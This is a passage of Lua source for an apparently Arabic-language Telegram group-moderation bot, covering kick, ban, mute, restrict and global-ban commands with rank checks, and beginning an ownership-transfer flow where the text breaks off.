send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع طرد » '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) and ChTwixDev(msg) then
local user = text:match('طرد (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع طرد » '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم طرده من المجموعه")  
end,nil)
end
end
end 
---------------------------------------------------------------------------------------
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) and ChTwixDev(msg) then
function BanReply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع حظر » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevHmD:sadd(DevTwix..'HmD:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) and ChTwixDev(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع حظر » '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevHmD:sadd(DevTwix..'HmD:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) and ChTwixDev(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع حظر » '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⋄︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⋄︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevHmD:sadd(DevTwix..'HmD:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم حظره من المجموعه")  
end,nil) 
end
end
---------------------------------------------------------------------------------------
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","⋄︙تم الغاء حظره من المجموعه")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevHmD:srem(DevTwix..'HmD:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","⋄︙تم الغاء حظره من المجموعه")  
end 
end 
---------------------------------------------------------------------------------------
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع كتم » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙هو بالفعل مكتوم من المجموعه")  
else
DevHmD:sadd(DevTwix..'HmD:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع كتم » '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⋄︙هو بالفعل مكتوم من المجموعه")  
else
DevHmD:sadd(DevTwix..'HmD:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم كتمه من المجموعه")  
end
end
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع كتم » '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⋄︙هو بالفعل مكتوم من المجموعه")  
else
DevHmD:sadd(DevTwix..'HmD:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم كتمه من المجموعه")  
end
end
end
---------------------------------------------------------------------------------------
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙هو ليس مكتوم لالغاء كتمه")  
else
DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⋄︙هو ليس مكتوم لالغاء كتمه")  
else
DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⋄︙هو ليس مكتوم لالغاء كتمه")  
else
DevHmD:srem(DevTwix..'HmD:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم الغاء كتمه من المجموعه")  
end
end 
end 
---------------------------------------------------------------------------------------
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم تقيده من المجموعه")  
end
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not HmDConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⋄︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا تستطيع تقيد » '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم تقيده من المجموعه")  
end
end
---------------------------------------------------------------------------------------
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم الغاء تقيده من المجموعه")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⋄︙تم الغاء تقيده من المجموعه")  
end
end 
end
---------------------------------------------------------------------------------------
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') and ChCheck(msg) then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.sender_user_id_) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevHmD:sadd(DevTwix..'HmD:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.id_) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.id_) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevHmD:sadd(DevTwix..'HmD:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم حظره عام من المجموعات")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) and ChCheck(msg) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',user) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',user) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevHmD:sadd(DevTwix..'HmD:BanAll:', user)
ReplyStatus(msg,user,"Reply","⋄︙تم حظره عام من المجموعات")  
end
---------------------------------------------------------------------------------------
--         MuteAll        --
if text ==('كتم عام') and ChCheck(msg) then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.sender_user_id_) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevHmD:sadd(DevTwix..'HmD:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') and ChCheck(msg) then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',result.id_) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.id_) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم كتمه عام من المجموعات")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') and ChCheck(msg) then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(DevTwix) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:HmDSudo:',user) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',user) and not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevHmD:sadd(DevTwix..'HmD:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⋄︙تم كتمه عام من المجموعات")  
end
---------------------------------------------------------------------------------------
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') and ChCheck(msg) then
function UnAllReply(extra, result, success)
DevHmD:srem(DevTwix..'HmD:BanAll:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⋄︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevHmD:srem(DevTwix..'HmD:BanAll:', result.id_)
DevHmD:srem(DevTwix..'HmD:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⋄︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevHmD:srem(DevTwix..'HmD:BanAll:', user)
DevHmD:srem(DevTwix..'HmD:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⋄︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
---------------------------------------------------------------------------------------
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "× تغير المطور الاساسي ×") and msg.reply_to_message_id_ == 0 and Sudo(msg) and ChCheck(msg) then 
send(msg.chat_id_, msg.id_,'⋄︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevHmD:setex(DevTwix.."HmD:EditDev"..msg.sender_user_id_,300,true)
end
if DevHmD:get(DevTwix.."HmD:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'⋄︙تم الغاء امر تغير المطور الاساسي')
DevHmD:del(DevTwix.."HmD:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevHmD:del(DevTwix.."HmD:EditDev"..msg.sender_user_id_)
DevHmD:set(DevTwix.."HmD:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n⋄︙المعرف » [@'..dp.username_..']' else DevUser = '' end
local Text = '⋄︙الايدي » '..dp.id_..DevUser..'\n⋄︙الاسم » ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n⋄︙تم حفظ المعلومات بنجاح\n⋄︙استخدم الازرار للتاكيد » '
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
